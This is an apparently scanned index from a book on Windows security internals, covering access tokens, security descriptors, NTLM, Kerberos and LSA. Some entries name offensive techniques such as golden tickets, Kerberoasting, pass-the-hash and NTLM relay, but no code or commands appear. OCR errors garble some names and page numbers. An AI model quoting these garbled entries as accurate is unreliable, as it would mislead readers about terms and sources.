DLLs, 65-69, 119 API sets, 67-68 delay loaded, 67 .DLL file extension, 69 export forwarding, 66 hijacking, 68-69 loading new libraries, 65-66 NTDL, 65-66 searching for, 68-70 untrusted, 66 viewing imported APIs, 66-67 DNS. See Domain Name System domain authentication, 300-304 domain forests, 302-304 enterprise network domains, 301-302 local authentication, 299-301 LSanLogger API, 403-404 domain forests, 302-304 global catalog, 303-304 multiple, 304 trust relationships, 303 DomainLocal group scope, 346-347 Domain Name System (DNS), 302, 344, 536 Active Directory domain configuration, 344-345 virtual machines, 540, 544 domain policy remote service, 312, 318-324 access rights, 319 account objects, 319-321 connecting to, 318-319 name lookup and mapping, 323-324 secret objects, 321-322 trusted domain objects, 322-323 domain security policies, 282 done state, 430 DOS device paths, 83-87 canonicalization, 84-85 displaying symbolic links, 83-84 DOS device map prefix, 83 maximum path lengths, 85-87 path separators, 84 path types, 84-85

double hop problem, 435 double type, 5

DPAPI (Data Protection API), 322, 516 drawing resource objects, 71 DTLS (Datagram Transport Layer Security) protocol, 506 Duplicate access right, 100 DWM (desktop window manager) process, 99, 405 Dynamic Access Control, 255 Dynamic Host Configuration Protocol (DHCP), 537, 540

## E

ECB (electronic code book), 333 Edit- commands, 158–159, 190, 364 Effective pseudo token handle, 108 effective token mode, 106 electronic code book (ECB), 333 Empty buffer flag, 500 Enabled attribute, 110, 114 EnabledByDefault attribute, 110, 114 Enable-MTokenPrivileges command, 114 enterprise access checks, 249–260 central access policy, 255–260 object type access checks, 249–255 enterprise authentication capability, 520–523 enterprise network domains, 301–302.

See also Active Directory domain controllers, 301–302 group policies, 302 EnumerateDomains access right, 313–314 Enumeratsetiers access right, 287 EPA (Extended Protection for Authentication), 444 escape characters, 7–8 Event Tracing for Windows (ETW), 292 Everyone ACEs, 365 explicit credentials, 437, 522–523 explicit token impersonation, 107 Export commands, 20, 533 exporting data to CLI XML format, 20–21 to CSV files, 20 to text files, 20 expressions, 5–8

Extended Protection for Authentication (EPA), 444 extended rights, 373–376

---

ExtendedSessionSecurity NTLM flag, 429-430


Extra buffer flag, 500

## [

FailedAccess ACE flag, 156, 168 Fast User Switching feature, 75, 417 File objects, 30, 41, 162, 169 ForceAccessCheck attribute flag, 224-225 ForcePasswordChange access right, 316 ForegroundColor parameter, 16 Format commands, 15, 27, 44, 60, 103, 159-161, 209, 359, 427 Forwardable flag, 472, 485-486, 490 Free state value, 50-51 FullName property, 9 function keyword, 13 functions, 13-14

## G

GDIJ32 library, 70-71 GenericALL access value, 37, 250-252, 254 GenericExecute access value, 37, 235 generic mapping, 39, 181 assigning security descriptors during resource creation, 181, 185 to existing resources, 206-207 kernel-mode access checks, 222 mandatory integrity level check, 235 mapping tables, 37 user-mode access checks, 225 GenericRead access value, 37, 39, 235 Generic Security Services Application Program Interface (GSSAPI), 476 GenericWrite access value, 37, 235 GetAliasMembership access right, 315 Get- commands, 7, 9-16, 26-27, 34, 37-39, 43-48, 50-51, 54, 56-57, 65-68, 72, 74, 78, 81, 83, 85-87, 93-94, 102-103, 108-110, 112-114,

147-148, 175-176, 179, 206, 208-209, 217-218, 226-229, 244-245, 257258, 261-262, 275-277, 286-287, 290, 305-306, 308, 310-312, 314-315, 317-320, 327, 344-348, 350-351, 356-357, 359, 363, 368-369, 373-374, 379, 382-384, 386, 390, 395, 400, 404-405, 411, 441, 470-471, 494-495, 543, 545

Get- functions, 140, 242, 339, 393-395, 431-433, 448, 532, 529 GetObject method, 59 GetPrivateInformation access right, 319 global catalog, 303-304, 352-353 Global group scope, 346-347 golden tickets, 462-463 Google Chrome web browser, 117 GrantedAccessMask property, 39 GroupByAddress parameter, 58 Group-Object command, 19, 58 group policies, 256-257, 409

Active Directory, 384-386 authentication to known web proxies, 521 enterprise network domains, 301-302 Group security information flag, 157, 183 GSSAPI (Generic Security Services Application Program Interface), 476 GSS _ functions, 476

## H

handles, 30, 35-42 access masks, 36-40 closing, 40 displaying handle tables, 39-40 duplicating, 40-41 duplicating unnamed, 187-188 duplication access checks, 269-272 finding open handles by name, 57 finding token handles to impersonate, 139-140 handle tables, 35

---

handles (continued) pseudo, 48, 108–109 registry, 80 windows, 73 handles property, 18–19 hash-based message authentication codes (HMACs), 429 hashtable type, 5 highestAvailable UAC execution level, 126 HKEY_CLASSES_ROOT handle, 90 Hyper-V, 47, 537–538

## |

IBM OS/2 operating system, 64, 85 Identification impersonation level, 105–106, 136 Identify request attribute flag, 519–520 identity tokens, 519–520 Id property, 14, 284 IIS (Internet Information Services) web server, 414 Image type, 53 Impersonate access right, 100, 104, 107 Impersonation impersonation level, 105 Impersonation pseudo token handle, 108 impersonation tokens, 104–107 explicit token impersonation, 107 impersonation context, 104 SQoS, 104–107 Import commands, 5, 20, 65–66 importing data, 20–21 InfoOnly parameter, 47, 314 InformationClass parameter, 43 inheritance, 215 auto-inheritance, 181 behavior, 197 dangers, 212 flags, 182, 194 parent security descriptors, 188–194

Inherit attribute flag, 42 Inherited ACE flag, 156, 158, 167, 212 InheritedObjectType GUID, 169, 203–205 InheritOnly ACE flag, 156, 167

initialization vectors, 329-330 Initialize access right, 313 InitialOwner parameter, 32, 79 input/output (I/O) manager, 24-25, 45-47 device drivers, 45 displaying device objects, 46 listing drivers, 47 opening device objects and displaying volume path, 46-47

Install- commands, 4, 545 Int64 security attribute type, 260 Integrated Windows Authentication (IWA), 424 Integrity attribute flag, 112-113 IntegrityEnabled attribute, 112 integrity levels, 102, 112, 124, 137 interactive authentication, 397-419, 458-464 AP-REP message, 464 AP-REQ message, 464 AS-REP message, 459-461 AS-REQ message, 458 creating new processes with tokens, 412-413 creating user desktops, 398-399 initial user authentication, 458-462 KDC service, 458 LsalogonUser API, 399-412 network service authentication, 465-465 pre-authentication data, 458 privilege attribute certificates, 459 Service logon type, 413-414 service principal names, 460 TGS-REP message, 461-462 TGS-REQ message, 460-461 ticket granting servers, 459 ticket granting tickets, 459 tickets, 458 worked examples, 414-419 Internet Explorer, 118-119 Internet Information Services (IIS) web server, 414 int type, 5

---

Invoke- commands, 14, 105 I/O manager, $reinput/output manager ISE (PowerShell Integrated Scripting Environment), 261 Isfiltered flag, 128, 269 Isrestricted flag, 269 IWA (Integrated Windows Authentication), 424

## J

John the Ripper, 496

## K

KDC service. See key distribution center service

Kerberoasting, 465, 495–496 Kerberos, 457–497

AP-REP message decryption, 476–477 AP-REQ message decryption, 469–476 CredSSP protocol, 512 cross-domain authentication, 477–479 delegation, 479–491 double hop problem, 435 golden tickets, 462–463 interactive authentication, 458–464 PKINIT, 477 via PowerShell, 465–469 service principal names, 443 silver tickets, 465 U2U authentication, 491–493 worked examples, 493–496 Kerberos Credential (KRBCRED), 483 Kerberos-only delegation (Service for User to Proxy), 485–486, 490 KERNEL32 library, 64–65 KERNELBASE library, 64–65 kernel-mode access checks, 222–225 access mode, 223–224 memory pointer checking, 224–225

parameters, 222 KernelObjects ODDS directory, 75 key distribution center (KDC) service cross-domain authentication, 478 decrypting AP-REQ message, 473, 475 initial user authentication, 458, 477 Kerberos-only delegation, 485 network service authentication, 463–464 protocol transition delegation, 486–487 resource-based delegation, 490 U2U authentication, 491 unconstrained delegation, 481 KeyExchange flag, 441 key version numbers, 467 KeywordsDisplayNames property, 290 KnownDtls OMSN directory, 69–70 KRB-CRED (Kerberos Credential), 483

## L

LAN Manager (LM), 306, 327 Less Privileged AppContainers (LPACs), 246 Lightweight Directory Access Protocol (LDAP), 342, 354–358, 371, 494 linked tokens, 126–129, 262 List access right, 366–367, 369 ListAccounts access right, 315 ListGroups access right, 316 ListMembers access right, 318 ListObject access right, 366, 369 LM (LAN Manager), 306, 327 local authentication, 299–301, 398 local domains, 300 LSalongüser API, 401–402 user database, 305 local call flag, 436 local domain configuration, 300, 305–311 LSA policy database, 309–312 user database, 305–309 local loopback authentication, 435–436

Index 539

---

locally unique identifiers (LUIDs), 102–103 Local Security Authority (LSA), 305, 309–324 extracting system keys, 327–328 logon account rights, 310–311 privilege account rights, 310 remote services, 311–324 Local Security Authority Subsystem (LSASS), 26, 92 creating tokens, 131–133 enumerating SIDs, 175–176 finding resources with audit ACEs, 295 linked tokens, 128 logon sessions, 102 local security policies, 282 logon account rights, 310–311, 415–416 LogonID attribute, 111, 405 logon types, 400, 402, 408–412 Network logon type, 409–411 NewCredentials logon type, 438 Service logon type, 413–414 LogonUI process, 92, 398 LongPathsEnabled value, 87 long type, 5 Lookup access right, 315 LookupDomain access right, 313–314 LookupNames access right, 319, 323 lowbox tokens, 120–122, 246–249, 273, 520–523 LPACs (Less Privileged AppContainers), 246 lParam parameter, 74 IpMuteAttributes parameter, 78 IpName parameter, 78 LSA. See Local Security Authority LSalogounter API, 399–414 accessing from PowerShell, 410–412 creating user desktops, 398–399 domain authentication, 403–404 local authentication, 401–402 logon and console sessions, 404–406 logon types, 400 protocol transition delegation, 489

_

security packages, 400-401 token creation, 407-410 LSASS. See Local Security Authority Subsystem

luaToken flag, 128, 140 LUIDs (locally unique identifiers), 102-103

## M

mandatory access checks (MACs), 228-237 access filter ACEs, 233-235 lowbox tokens, 247-248 mandatory integrity level check, 235-237 process trust level check, 231-233 mandatory access control, 102, 143 Mandatory attribute, 110 Mandatory Integrity Control (MIC), 230 mandatory integrity level check, 235-237 mandatory label ACEs, 154, 167 access strings, 172 assigning security descriptors during resource creation, 201-203 integrity level SIDs, 172 MandatoryLabel security authority, 112 mandatory policy values, 161 MapGenericRights parameter, 39 MapWrite access, 52, 58 MD4 hashes, 306, 432 MD5 hashes, 329, 431, 466 memory manager, 49-54 finding writable and executable memory, 60-61 MtVirtualMemory commands, 49-51 pagefiles, 49 prefix, 25 Section objects, 51-54 virtual memory space, 49 memory pointer checking, 224-225 message integrity codes (MICs), 425, 429, 433 message loops, 73 Microsoft Visual Studio, 261, 538

1

---

ModifyState access, 42, 270-271 Mutant objects, 29-30, 181, 187, 193 mutual authentication, 464 MutualAuth flag, 483 MutualAuthRequired flag, 469

## N

Nagle algorithm, 448 NAT (network address translation), 537 Negotiate security package, 401, 508–505 initializing, 503–505 security mechanisms, 504 specifying credentials, 504 NegotiateStream class, 445 NetCredential-only flag, 413 Netlogon protocol, 342, 403 network address translation (NAT), 537 network authentication, 421–455 credentials, 407 lowbox tokens, 520–523 NTLM network authentication, 422–438 NTLM relay attacks, 438–445 worked example, 445–454 Network Level Authentication (NLA), 511 Network logon type, 409–411 New- commands, 8, 12–13, 46, 51–53, 56, 81, 85, 88–89, 192–193, 157, 251, 273, 306–307, 309, 325, 361, 381, 389–390, 424, 500, 507, 537, 539

NewCredentials logon type, 438 New- function, 189, 232, 538–539 NewGuid static method, 8 NLA (Network Level Authentication), 511 None ACE flag, 193 NoPropagateInherit ACE flag, 156, 167, 193–194 NoRightsUpgrade flag, 188, 270–271 Notification access right, 319 Nt (Wu) prefix, 24, 29–30, 224 NtAccessCheck system calls, 225–227, 249, 254, 291 NtAdjust system calls, 110, 114–115

1

NtAllocate system calls, 49–50, 102, 409 NtChallengeResponse system call, 433 NtCloseObjectAuditAlarm system call, 291 NtCreate system calls, 29–30, 55, 77, 116, 120, 132 NTDLLE (NT Layer dynamic link library), 65–66 NtDuplicate system calls, 41, 107 NtFilterToken system call, 117 NtFreeVirtualMemory system call, 49 NT hashes, 306, 326–327, 332, 334 NtImpersonate system calls, 106–107 NTLM (NT LAN Manager) flags, 425, 427 network authentication, 422–438 authentication tokens, 423 bypassing proxy check, 523–524 cracking user passwords, 428–429 CredSSP protocol, 512 cryptographic derivation process, 431–433 explicit credentials, 437 impersonating tokens, 437–438 local administrators, 430–431 local loopback authentication, 435–436 Negotiate security package, 503–505 pass-through authentication, 434–435 variants of, 422 via PowerShell, 423–430 relay attacks, 438–445 active server challenges, 440 channel binding, 444–445 example of, 439 signing and sealing, 440–443 target names, 443 security package, 401 NtLoadDriver system call, 45, 116 NmMake system calls, 40–41 NmMapViewOfSection system call, 51 NtObjectManager module, xx, 356, 359

Index 561

---

NTOpen system calls, 100, 291 NTPrivilegeCheck system call, 115 NTQuery system calls, 30, 39, 47, 49, 126, 179–180 NtReadVirtualMemory system call, 49 NtSecurityDescriptor attribute, 558, 380 NtSetInformation system calls, 107, 128, 131–132, 135 NtSetSecurityObject system call, 905–906 NTSTATUS codes, 32–35, 77–78 NtWriteVirtualMemory system call, 49 NullSession request attribute flag, 518

## O

ObjectAccess audit category, 284-285 ObjectAttributes parameter, 30-31 OBJECT_ATTRIBUTES structure, 30-32 ObjectClass attribute, 351, 355 ObjectInherit ACE flag, 156, 167 object manager, 24, 180-181 displaying object types, 27-28 DOS device paths, 83-84 finding owners, 216-218 NTSTAUS codes, 32-35 object directories, 29 object handles, 35-42 object manager namespace, 28 automating access checks, 275-276 permanent objects, 40-41 registry, 55 traversal checking, 266-267 Win32 registry paths, 80-82 prefix, 24 system calls, 29-32 Query and Set system calls, 42-45 ObjectName parameter, 31-32, 291 objects

accessing properties, 8 attribute flags, 32 creating, 8 directories, 29 displaying, 14-17, 27 filtering, 17-19

finding shared objects, 57–59 grouping, 19 handles, 30, 35–42, 187–188 invoking methods, 8 naming, 31 permanent, 40–41 sorting, 18–19 object type access checks, 249–255 ObjectType GUID, 169, 203–205 ObjectTypes parameter, 249, 251–253 Oem NTLM flag, 427 OsAsDelegate flag, 481–483 OMNs. See object manager namespace under object manager operators, 6, 14, 18 infix, 171 unary, 170 Oracle VirtualBox, 537 organizational units, 385–386 Out- commands, 16–17, 20, 54, 60 Owner attribute, 111 owner check, 184, 240–241 Oem security information flag, 184

## P

pagefiles, 49 Paging parameter, 16 Parameter command, 11 parameters, 9, 11 parent security descriptors, 180, 182, 185-203 inheritance rules, 215 setting both creator and parent, 195-200 setting neither creator nor parent, 185-188 setting parent only, 188-195 pass-the-hash technique, 306 pass-through authentication, 434-435 PassInfo parameter, 17, 285 Password-Based Key Derivation Function 2 (PBKDFv2) algorithm, 471 password encryption keys (PEKs) decryptioning, 328-330 decrypting password hashes, 330-332

---

Path parameter, 9 PDC (primary domain controller) emulator, 345 Permanent attribute flag, 40 per-user audit policies, 285–287 PIDs (process IDs), 47–48 pipeline (l), 9 PkgParms buffer flag, 500–501 PKINIT (Public Key Initial Authentication), 477 Plug and Play (PnP) manager, 45 POSIX, 64, 85, 145 PowerShell, 3–21 configuring, 4–5 discovering commands, 10 displaying and manipulating objects, 14–17 equivalent SDK names, 38 executing commands, 9–10 exporting data, 20–21 expressions, 5–8 filtering objects, 17–19 functions, 13–14 getting help, 10–13 grouping objects, 19 Integrated Scripting Environment, 261 line breaks, xxviii modules, 4–5 operators, 6 script execution policy, 4–5 sorting objects, 18–19 string character escapes, 7–8 string interpolation, 7 style conventions for examples in book, xxvii–xxviii types, 5–6, 8 variables, 6–7 versions of, 3–4 pre-authentication data, 458–459 PreviousMode value, 223–224 primary domain controller (PDC) emulator, 345 Primary tokens, 100, 108, 133–134 Principal parameter, 249–250 print Shell verb, 90–91 printto Shell verb, 90–91

privilege attribute certificates (PACs), 408 cross-domain authentication, 478–479 decrypting AP-REQ message, 472–475 delegation, 487 golden tickets, 462 initial user authentication, 458–462 network service authentication, 464 silver tickets, 465 privilege checks, 238–239 process and thread manager, 24, 47–48 displaying processes and threads, 47–48 opening processes and threads, 48 prefix, 25 process and thread IDs, 47 process creation, 87–91 command line parsing, 88–89 Shell APIs, 89–91 process IDs (PIDs), 47–48 ProcessName property, 14, 19 Process objects, 18, 42 Process parameter, 49 Process TrustLabel ACEs, 154, 167 process trust level checks, 231–233 property sets, 251, 373–376 Protectedacl security information flag, 210–211, 364 ProtectedData class, 516 protected objects, 381–382 protected processes, 231–233 Protectedacl security information flag, 210 ProtectFromClose attribute, 42 Protect-LsaContextMessage command, 441 protocol transition delegation (Service for User to Self), 486– 488, 490 Proxy Auto-Configuration (PAC) scripts, 521 pseudo handles, 48, 108–109 Public Key Initial Authentication (PKINIT), 477

Index 563

---

## Q

Query access right, 100

QueryInformation class, 45

QueryInformation system call verb, 30

QueryLimitedInformation access right, 49, 61

QueryMiscPolicy access right, 287

QuerySource access right, 100

Query system call, 42-45

QuerySystemPolicy access right, 287

QueryUserPolicy access right, 287

QueryValue access right, 322

## R

rainbow tables, 429 RC4 encryption algorithm, 327-328, 331, 442, 466, 470 RDP (Remote Desktop Protocol), 75, 77 RDS (Remote Desktop Services), 74, 77 ReadAccount access right, 316 Read- commands, 49-51, 307, 410 ReadControl access right, 36, 178, 240-241 ReadGeneral access right, 316 ReadGroupInformation access right, 316 ReadInformation access right, 318 ReadLogon access right, 316 ReadOnly buffer flag, 501 ReadOnly protection state, 49 ReadOnlyWithChecksum buffer flag, 501 ReadOtherParameters access right, 315 ReadPasswordParameters access right, 314-315 ReadPreferences access right, 316 ReadProp access right, 366, 370 Read-TlsRecordToken function, 532 Receive- functions, 448 referral tickets, 478-479 regedit application, 80 registry (configuration manager), 24, 55-56 attachment points, 56 hives, 56 keys and values, 55-56 prefix, 25 relative distinguished names, 349-350

relative identifiers (RIDs), 26, 112

AppContainer and lowbox tokens, 120–121 cycling, 323, 336–337 mandatory integrity level checks, 235 SID structure, 146–149 user database, 306–308 relative security descriptors, 149–151, 163–164 RemainingAccess value, 229–230 remote access check protocol, 389–390 Remote Credential Guard, 513 Remote Desktop Protocol (RDP), 75, 77 Remote Desktop Services (RDS), 74, 77 remote procedure calls (RPCs), 55, 104 Remote Procedure Call Subsystem (RPCSS), 92–93 Remote Server Administration Tools (RSAT), 343–344 Remove- commands, 49–52, 56, 115, 308–309, 311, 324, 369, 416 RemoveMember access right, 318 Renewable flag, 472 requireAdministrator UAC execution level, 126 Reserve state value, 50 Reset-Win32SecurityDescriptor command, 211 Resolve- functions, 238, 240, 244 Resource attribute, 113, 408 ResourceAttribute ACEs, 154, 167 resource-based delegation, 489–491 resource manager flags, 144–145, 149 Restricted Admin node, 513–514, 525 RestrictedDkbHost class, 467–468 restricted tokens, 117–119, 244–245 return keyword, 13 RIDs. See relative identifiers RmControlWald control flag, 149 RootDirectory parameter, 31–32 Root Directory System Agent Entry (RootDE), 350

564 Index

---

RPCs (remote procedure calls), 55, 104 RSAT (Remote Server Administration Tools), 343-344

rtlNewSecurityObjectX system call, 182 Rubeus, 496

## S

S4U. See constrained delegation S4U2proxy (Service for User to Proxy), 485-486, 490 S4U2self (Service for User to Self), 486-488, 490 SvcAutoInherit auto-inherit flag, 209-210 Svc control flags, 145, 166, 181 SACLS. See security access control lists SAM. See security account manager database; security account manager remote service sandbox tokens, 117-122, 244-249 access checks, 272-274 lowbox tokens, 120-122, 246-249 restricted tokens, 117-118, 244-245 write-restricted tokens, 119 SAS (secure attention sequence), 399 SCM (service control manager), 92-93 ScopedPolicyId ACES, 154, 167 script blocks, 14, 18 SDDL format. See Security Descriptor Definition Language format SDK (software development kit), 38, 110, 112 SDkName property, 38, 161 Search-Win32SecurityDescriptor command, 212-213 SeAssignPrimaryTokenPrivilege privilege, 116 SeAuditPrivilege privilege, 116 SeBackupPrivilege privilege, 116, 123 SeBatchLogonRight account right, 311, 402, 416 SeChangeNotifyPrivilege privilege, 116, 267 setpol.msc command, 282 SeCreateTokenPrivilege privilege, 116, 123, 132

Section objects, 217 creating sections and mapping to memory, 51–52 finding shared, 57–59 finding writable, 278–279 listing mapped files with names, 53 mapping and viewing loaded images, 53–54 modifying mapped sections, 59–60 secure attention sequence (SAS), 399 secure channel, 506–510 encrypting and decrypting application data, 508–509 extracting server TLS certificates, 530–533 inspecting connection information, 508 setting up, 506–507 TLS record structure, 507 Secure Sockets Layer (SSL) protocol, 506–507 SecureString class, 507 security access control lists (SACLs), 145–146 control flags, 144–145, 166, 181 global, 292–293 resource, 288–291 security access tokens administrator users, 122–124 assigning, 133–138 converting/duplicating, 107–108 creating, 131–133 groups, 109–113 impersonation tokens, 104–107, 136–138 integrity levels, 102 primary tokens, 100–104, 133–136 privileges, 113–117 pseudo token handles, 108–109 sandbox tokens, 117–122 security attributes, 130–131, 172 Int64 security attribute type, 260 User Account Control, 124–130 worked examples, 138–141 security account manager (SAM) database, 312, 324–334 accessing through registry, 325–334

Index 565

---

security account manager (continued) pre-Active Directory enterprise network configuration, 342 security account manager (SAM) remote service, 312–318 access rights, 313 alias objects, 318 domain objects, 314 group objects, 317 user objects, 315–316 SECURITY ATTRIBUTES structure, 78–79 security auditing, 281–295 audit policy security, 287–293 security event log, 282–286 worked examples, 287–295 security authority, 147 MandatoryLabel, 112 World, 219 SecurityBuffer class, 500 security buffers, 500 with authentication context, 501–502 with signing and sealing, 502–503 SECURITY database, 324, 334–336 Security Descriptor Definition Language (SDDL) format, 26, 165–173 access strings, 168–169, 172 ACE flag strings, 167 ACL flag strings, 166 conditional expressions, 170–171 converting security descriptors to, 165 mandatory label integrity level SIDs, 172 ObjectType GUIDs used in AD, 169 security attribute SDDL type strings, 172 SID aliases, 166, 547–549 splitting components, 165 type strings mapped to ACE types, 167 SecurityDescriptor objects, 151, 157 security descriptors, 143–220 absolute and relative, 149–151 access control lists, 151–156

assigning during resource creation, 180–205 to existing resources, 205–208 components of, 144–146 converting to and from relative descriptors, 163–164 to SDDL format, 165 creating, 157–158 formatting, 159–163 inheritance behavior, 214–215 ordering ACEs, 158–159 reading, 178–179 SDDL format, 165–173 server security descriptors and compound ACEs, 213–214 SID structure, 146–149 standardization, 362 structure of, 144 Win32 security APIs, 208–213 worked examples, 173–176, 216–219 security event log, 282–286 audit events and event IDs, 282 audit policy subcategories, 284 configuring per-user audit policy, 285–286 system audit policy, 282–285 displaying category GUIDs, 284 setting policy and viewing resulting policy list, 284–285 top-level audit policy categories, 283 security identifiers (SIDs), 26–27, 81, 146–149 administrator users, 124 aliases, 166, 547–549 arbitrary owner, 184 asserted identities, 489–490 assigning tokens, 137 capability, 120–121 capability groups, 121 components of, 146–147 creating tokens, 132–133 device groups, 113 enumerating, 175–176 fixed logon sessions, 102 group, 145 integrity levels, 112

---

logon types, 408–409, 414 lowbox tokens, 120–122 machine, 306 mandatory label integrity level, 172 manually parsing binary, 175–175 owner, 145 process trust level, 231–232 pseudo token handles, 109 querying Administrators group SID, 148 replacing CREATOR OWNER and CREATOR GROUP SIDs, 200 restricted tokens, 117–118 SDDL SID atlas mapping, 547–549 SELF.SID, 249–250, 379–380 token groups, 111–113 tokens, 101 SecurityInformation flags, 178, 205–206 Dacl, 211 Group, 157, 183 Owner, 184 ProtectedDacl, 210–211, 364 ProtectedSac1, 210 UnprotectedDacl, 210–211 UnprotectedSac1, 210 security packages (security support providers), 400–401, 499–533 anonymous sessions, 518–519 authentication audit event log, 524–527 credential manager, 514–517 CredSSP, 510–513 identity tokens, 519–520 Negotiate, 401, 503–505 network authentication with lowbox token, 520–523 Remote Credential Guard, 513 Restricted Admin mode, 513–514 secure channel, 506–510 security buffers, 500–503 worked examples, 527–533

Security Quality of Service (SQoS), 32, 104–107 context tracking mode, 106 effective token mode, 106 impersonation levels, 104–106

SECURITY_QUALITY_OF_SERVICE structure, 104, 107

Security Reference Monitor (SRM), 24–27

access checks, 25 process, 221–263 use cases, 265–280 access tokens, 25 audit events, 26 components of, 25

Local Security Authority Subsystem, 26 prefix, 24 security access tokens, 99–141 security auditing, 281–295 security descriptors, 143–176 security identifiers, 26–27

SECURITY_SOOS_PRESENT flag, 107 SECURITY_SUBJECT_CONTEXT structure, 222, 272 Security Support Provider Interface (SSPI), 424, 440, 476, 500, 518 security support providers. See security packages SeDebugPrivilege privilege, 116, 123 SeDenyBatchLogonRight account right, 311, 402 SeDenyInteractiveLogonRight account right, 311, 402 SeDenyNetworkLogonRight account right, 311, 402 SeDenyRemoteInteractive account right, 402 SeDenyRemoteInteractiveLogonRight logon right, 311 SeDenyServiceLogonRight account right, 311, 402 SeEnableDelegationPrivilege privilege, 381 SeFastTraverseCheck function, 268 SeImpersonatePrivilege privilege, 116, 123 SeInteractiveLogonRight account right, 311, 402 SeIsTokenAssignableIoProcess function, 134 Select-HiddenValue function, 95–96

Index 567

---

SelectObject command, 14-15, 17 Self access right, 366, 378-379 SelfRelative control flag, 149-151 SeLoadDriverPrivilege privilege, 116, 123 SeMachineAccountPrivilege privilege, 380 Send- functions, 448-449 SeNetworkLogonRight account right, 511, 402 sequence numbers, 442 SeRelabelPrivilege privilege, 117, 123, 202, 239 SeRemoteInteractiveLogonRight account right, 311, 402 SeRestorePrivilege privilege, 116, 123, 219 ServerAdmin access right, 319 Server Message Block (SMB), 105, 422, 439-440, 442 ServerSecurity control flag, 213-214 service control manager (SCM), 92-93 Service for User. See constrained delegation Service for User to Proxy (aka S4U2proxy or Kerberosonly delegation), 485-486, 490 Service for User to Self (aka S4U2self or protocol transition delegation), 486-488, 490 Service logon type, 413-414 service principal names (SPNs), 443 authentication cross-domain, 478 with explicit credentials, 522 initial user, 460-462 Kerberos authentication in PowerShell, 466 to known web proxies, 522 network service, 463-464 U2U, 491-493 bypassing proxy check, 523-524 decrypting AP-REQ message, 469-470 delegation, 482, 484, 486, 488-490 SeSecurityPrivilege privilege, 116, 127, 287-288

SeServiceLogonRight account right, 311, 402 Session 0 Isolation feature, 76 Session Manager Subsystem (SMSS), 92 Session objects, 75 SetIakeOwnershipPrivilege privilege, 117, 123, 239 SetAuditRequirements access right, 319 SetCchPrivilege privilege, 116, 123 Set- commands, 44, 49–51, 56, 110, 135, 209–210, 286–288, 469, 486, 489, 539 SetDefaultQuotaLimits access right, 319 SetTimeZonePrivilege privilege, 115–116 SetInformation class, 30, 45 SetMixPolicy access right, 287 SetTrustedCredmanAccessPrivilege privilege, 516–517 Set system call, 42–45, 99 SetSystemPolicy access right, 287 SetUserPolicy access right, 287 SetValue access right, 322 SHA256 algorithm, 121–122 SHA384 algorithm, 508 shatter attacks, 76 $HELLT2 library, 89 Shell APIs, 89–91 shell verbs, 91 Show- commands, 60, 100, 104, 131, 162 ShowWindow parameter, 11–12 Shutdown access right, 313 sibling tokens, 134–135 SID aliases, 166, 548–549 SIDs. See security identifiers SignatureType property, 55 signing and sealing NTLM relay attacks, 440–443 security buffers, 502–503 silver tickets, 465 Simple and Protected Negotiation Mechanism (SPNEGO) protocol, 503–505 SingleHost flag, 429 SkipTokenGroups flag, 389 SMB (Server Message Block), 105, 422, 439–440, 442 SMSS (Session Manager Subsystem), 92

---

software development kit (SDK), 38, 110, 112 Sort-Object command, 18–19 split-token administrator, 124, 126, 128–129, 262 SPNEGO (Simple and Protected Negotiation Mechanism) protocol, 503–505 SPNs. See service principal names QoS. See Security Quality of Service SRM. See Security Reference Monitor SSL (Secure Sockets Layer) protocol, 506–507 SSPI (Security Support Provider Interface), 424, 440, 476, 500, 518 Start-command, 88, 276, 325 static methods, 8 Stream buffer flag, 500 StreamHeader buffer flag, 500, 509 StreamTracker buffer flag, 500, 509 strings ANSI, 79 character escapes, 7–8 double-quoted, 7 interpolation, 7 secure, 307 single-quoted, 7 wide, 79 string type, 5 Structural_category attribute, 354 SuccessfulAccess ACE flag, 156, 168 superions, 367–368 SymbolicLink objects, 28–29 SymbolicLinkTarget property, 28–29 system audit policy, 282–285, 287 system calls common verbs, 30 status codes, 34 Win32 APIs and, 77–80 system processes, 91–93 Local Security Authority Subsystem, 92 service control manager, 92–93 Session Manager Subsystem, 92 Windows logon process, 92 SystemProcessInformation class, 47

## T

TargetInfo flag, 427 TargetTypeDomain flag, 427 TargetTypeServer flag, 427 Task Scheduler service, 93 TGB (trusted computing base), 116 TCP, 446, 532 TcpClient objects, 452 TCP/IP, 47, 342 TcpListener class, 451 Terminal Services, 77 Test-AccessFilter check, 231 Test- commands, 115–116, 138, 189–190, 240–241, 243, 259, 430, 441–442 Test- functions, 230, 393 Test-MandatoryIntegrityLevel check, 231 Test-ProcessTrustLevel check, 231 TGS-REP message. See ticket granting service reply message TGS-REQ message. See ticket granting service request message TGSs. See ticket granting servers TGT-REP (ticket granting ticket reply) message, 491–493 TGT-REQ (ticket granting ticket request) message, 491–492 TGTs. See ticket granting tickets thread affinity, 73 thread IDs (TIDs), 47–48 Thread objects, 27, 48, 203 ticket granting servers (TGSs) cross-domain authentication, 478–479 decryption API-REQ message, 469 delegation, 479–482, 485 initial user authentication, 459–461 Kerberos authentication in PowerShell, 466 network service authentication, 464 ticket granting service reply (TGS-REP) message initial user authentication, 458, 461–462 Kerberos authentication in PowerShell, 466

Index  |  569

---

ticket granting service reply (continued) network service authentication, 464 ticket granting service request (TGS-REQ) message delegation, 479, 481, 485 initial user authentication, 458 Kerberos authentication in PowerShell, 466 network service authentication, 463–464 U2U authentication, 492 ticket granting ticket reply (TGT-REP) message, 491–493 ticket granting ticket request (TGTREQ) message, 491–492 ticket granting tickets (TGTs) delegation, 479–485 initial user authentication, 459–461 network service authentication, 463–464 U2U authentication, 491–493 TIDs (thread IDs), 47–48 TLS protocol. See Transport Layer Security protocol ToCharArray method, 8 token access checks, 227–228, 230, 237–241 owner check, 240–241 privilege check, 238–239 Token buffer flag, 500–502 TokenLinkedToken class, 126, 128 Token objects creating, 407–410 creating new processes with, 412–413 requesting for authenticated users, 430 Token Viewer application, 100–101, 103 Transport Layer Security (TLS) protocol channel binding, 444–445 CredSSP, 511–512 extracting certificates, 530–533 secure channel, 506–510 traversal checks, 266–269 limited checks, 267–269 $eChangeNotifyPrivilege privilege, 267

Traverse access right, 266-269 TrustAdmin access right, 319 trusted computing base (TCB), 116 TrustedForDelegation control flag, 381, 482 TrustedToAuthenticateForDelegation control flag, 381 TrustedToAuthForDelegation flag, 487-489 TrustProtected ACE flag, 156, 168 trust relationships, 303-304, 322, 477-479 TS Service Security Package (TSSSP), 511-512 Type objects, 27 types, 5, 8

## U

